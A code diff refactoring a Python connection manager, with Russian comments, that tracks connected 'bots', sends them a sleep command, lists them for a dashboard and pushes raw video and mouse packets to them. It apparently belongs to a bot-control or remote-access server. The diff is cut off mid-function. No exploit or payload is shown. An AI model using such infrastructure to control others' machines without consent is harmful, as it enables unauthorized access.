@@ -1,40 +1,42 @@
+# backend/Services/ClientManager.py
+
 from logs import Log as logger
 
-# Реестр активных сокетов (обязательно должен быть тут)
-client = {}  # {id: (reader, writer)}
+# Глобальный реестр активных соединений {id: (reader, writer)}
+client = {}
 
-async def close_client(client_id: str, send_sleep: bool = True) -> bool:
-    """Отключает бота и удаляет его из активных соединений."""
-    if client_id in client:
-        _, writer = client[client_id]
-        try:
-            if send_sleep:
-                writer.write(b"sleep\n")
-                await writer.drain()
-            writer.close()
-            await writer.wait_closed()
-        except: pass
-        finally:
-            client.pop(client_id, None)
-            logger.info(f"[-] Бот {client_id} отключен")
-        return True
-    return False
+async def close_client(client_id, send_sleep=True):
+    """Принудительное отключение конкретного клиента"""
+    if client_id not in client:
+        return False
+        
+    _, writer = client[client_id]
+    try:
+        if send_sleep:
+            writer.write(b"sleep\n")
+            await writer.drain()
+        writer.close()
+        await writer.wait_closed()
+    except:
+        pass
+    finally:
+        client.pop(client_id, None)
+        logger.info(f"[-] Бот {client_id} отключен")
+    return True
 
-async def close_all_client() -> int:
-    """Отключает всех ботов."""
+async def close_all_client():
+    """Массовое отключение всех ботов (например, при выключении сервера)"""
     ids = list(client.keys())
-    for cid in ids: await close_client(cid)
+    for cid in ids:
+        await close_client(cid)
     return len(ids)
 
-def list_clients() -> list:
-    """
-    Возвращает список ID онлайн-ботов. 
-    API использует это для отображения статуса.
-    """
+def list_clients():
+    """Список текущих онлайн-сессий для Dashboard"""
     return [{"id": cid, "status": "online"} for cid in client.keys()]
 
-async def send_binary_to_bot(bot_id: str, packet: bytes) -> bool:
-    """Отправляет бинарный пакет (видео/мышь) боту."""
+async def send_binary_to_bot(bot_id, packet):
+    """Низкоуровневая отправка сырых байтов (команды API)"""
     if bot_id in client:
         try:
             _, writer = client[bot_id]
